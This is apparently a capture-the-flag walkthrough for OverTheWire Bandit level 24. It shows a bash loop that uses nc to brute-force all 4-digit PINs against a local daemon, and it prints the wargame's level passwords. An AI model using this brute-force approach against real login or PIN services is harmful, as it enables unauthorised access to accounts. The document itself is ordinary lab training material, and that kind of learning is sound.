1.  First loging in to the remote server via ssh

        $ ssh bandit24@bandit.labs.overthewire.org -p 2220
		  username: bandit24
		  password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 

	
2.	As the admin says -
		 " A daemon is listening on port 30002 and will give you the password for 
		 bandit25 if given the password for bandit24 and a secret numeric 4-digit 
		 pincode. There is no way to retrieve the pincode except by going through all of 
		 the 10000 combinations, called brute-forcing.


3.	So, we have to test all the  pins from 0000 to 10000, we proceed by making a small
	BASH script

		$ mkdir /tmp/my
		$ touch script

			#!/bin/bash

			pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"


			for i in {0..9}{0..9}{0..9}{0..9};
			do
    			echo $pass $i | nc localhost 30002 >> result.txt
    			echo attempting PIN $i
			done

		$ sort result | uniq -u 
		uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG



~>	This script uses brace expansion to attempt a "4-digit PIN code" on service running 
	on port 30002.
	Hence, we get the password string for next level-25 "uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG"
